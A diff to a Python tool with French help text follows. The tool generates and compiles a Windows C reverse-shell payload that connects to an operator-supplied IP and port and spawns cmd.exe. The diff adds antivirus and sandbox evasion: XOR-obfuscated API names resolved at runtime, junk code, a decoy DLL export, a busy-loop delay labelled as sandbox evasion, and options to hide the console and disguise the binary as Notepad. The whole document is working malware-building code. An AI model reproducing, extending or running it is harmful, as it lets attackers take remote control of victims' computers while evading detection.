@@ -12,13 +12,22 @@ def encrypt_bytes(text):
     encrypted = aes.encrypt(padded)
     return ', '.join(f'0x{b:02X}' for b in encrypted)
 
+def xor_string(s, xor_key=0x55):
+    return ''.join(f'\\x{ord(c) ^ xor_key:02x}' for c in s)
+
 def generate_payload_c(ip, cmd, port, notepad=False, hidden=False):
     ip_enc = encrypt_bytes(ip)
     cmd_enc = encrypt_bytes(cmd)
 
-    create_flags = "0"
-    if hidden:
-        create_flags = "CREATE_NO_WINDOW"
+    xor_key = 0x55
+    xws2 = xor_string("ws2_32.dll", xor_key)
+    xk32 = xor_string("kernel32.dll", xor_key)
+    xWSAStartup = xor_string("WSAStartup", xor_key)
+    xWSASocketA = xor_string("WSASocketA", xor_key)
+    xconnect = xor_string("connect", xor_key)
+    xCreateProcessA = xor_string("CreateProcessA", xor_key)
+
+    create_flags = "CREATE_NO_WINDOW" if hidden else "0"
 
     with open("payload.c", "w") as f:
         f.write(f'''#include <winsock2.h>
@@ -29,10 +38,38 @@ def generate_payload_c(ip, cmd, port, notepad=False, hidden=False):
 
 #pragma comment(lib, "ws2_32")
 
+__declspec(dllexport) void LegitEntryPoint() {{}}
+
+void junk_func() {{
+    int x = 123;
+    for (int i = 0; i < 1000; i++) {{
+        x ^= (x << 1) + i;
+    }}
+}}
+
 const uint8_t key[16] = "1GJ7d9gY57Fdjo43";
 
 uint8_t enc_ip[]  = {{ {ip_enc} }};
 uint8_t enc_cmd[] = {{ {cmd_enc} }};
+
+char* xor_decrypt(const char* data, char* output, char key) {{
+    int i = 0;
+    while (data[i]) {{
+        output[i] = data[i] ^ key;
+        i++;
+    }}
+    output[i] = 0;
+    return output;
+}}
+
+FARPROC ResolveFunc(const char* xDll, const char* xFunc) {{
+    char dll[64], func[64];
+    xor_decrypt(xDll, dll, 0x{xor_key:02x});
+    xor_decrypt(xFunc, func, 0x{xor_key:02x});
+    HMODULE h = LoadLibraryA(dll);
+    if (!h) return NULL;
+    return GetProcAddress(h, func);
+}}
 
 void aes_decrypt_string(uint8_t* encrypted, char* output) {{
     struct AES_ctx ctx;
@@ -44,14 +81,10 @@ void aes_decrypt_string(uint8_t* encrypted, char* output) {{
     output[15] = '\\0';
 }}
 
-FARPROC ResolveFunc(const char* dllName, const char* funcName) {{
-    HMODULE hMod = LoadLibraryA(dllName);
-    if (!hMod) return NULL;
-    return GetProcAddress(hMod, funcName);
-}}
-
 int main() {{
-    Sleep(5000);
+    // Sandbox evasion: fake workload instead of Sleep
+    for (volatile int i = 0; i < 50000000; i++) {{}}
+
     char ip[16], cmd[16];
     aes_decrypt_string(enc_ip, ip);
     aes_decrypt_string(enc_cmd, cmd);
@@ -62,10 +95,17 @@ int main() {{
     typedef BOOL (WINAPI *CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                                BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 
-    WSAStartupFunc       _WSAStartup     = (WSAStartupFunc)ResolveFunc("ws2_32.dll", "WSAStartup");
-    WSASocketAFunc       _WSASocketA     = (WSASocketAFunc)ResolveFunc("ws2_32.dll", "WSASocketA");
-    ConnectFunc          _connect        = (ConnectFunc)ResolveFunc("ws2_32.dll", "connect");
-    CreateProcessAFunc   _CreateProcessA = (CreateProcessAFunc)ResolveFunc("kernel32.dll", "CreateProcessA");
+    const char xDll1[] = "{xws2}";
+    const char xDll2[] = "{xk32}";
+    const char xWSAStartup[] = "{xWSAStartup}";
+    const char xWSASocketA[] = "{xWSASocketA}";
+    const char xconnect[] = "{xconnect}";
+    const char xCreateProcessA[] = "{xCreateProcessA}";
+
+    WSAStartupFunc     _WSAStartup     = (WSAStartupFunc)ResolveFunc(xDll1, xWSAStartup);
+    WSASocketAFunc     _WSASocketA     = (WSASocketAFunc)ResolveFunc(xDll1, xWSASocketA);
+    ConnectFunc        _connect        = (ConnectFunc)ResolveFunc(xDll1, xconnect);
+    CreateProcessAFunc _CreateProcessA = (CreateProcessAFunc)ResolveFunc(xDll2, xCreateProcessA);
 
     if (!_WSAStartup || !_WSASocketA || !_connect || !_CreateProcessA)
         return 1;
@@ -98,6 +138,7 @@ int main() {{
 
     return 0;
 }}''')
+
     print("[+] payload.c généré.")
 
     if notepad:
@@ -164,13 +205,13 @@ def compile_payload(notepad=False, keep=False, hidden=False):
             print("[*] Option --keep activée : fichiers temporaires conservés.")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Générateur de payload chiffré AES + compilation automatique")
+    parser = argparse.ArgumentParser(description="Payload AES furtif + génération compilée")
     parser.add_argument("--ip", required=True, help="Adresse IP à chiffrer")
     parser.add_argument("--port", type=int, default=49557, help="Port TCP (par défaut : 49557)")
     parser.add_argument("--cmd", default="cmd.exe", help="Commande à exécuter (par défaut : cmd.exe)")
     parser.add_argument("--notepad", action="store_true", help="Faux notepad avec icône et métadonnées")
     parser.add_argument("--keep", action="store_true", help="Conserver les fichiers temporaires")
-    parser.add_argument("--hidden", action="store_true", help="Masquer la console à l'exécution")
+    parser.add_argument("--hidden", action="store_true", help="Masquer la console et le cmd.exe")
 
     args = parser.parse_args()
 
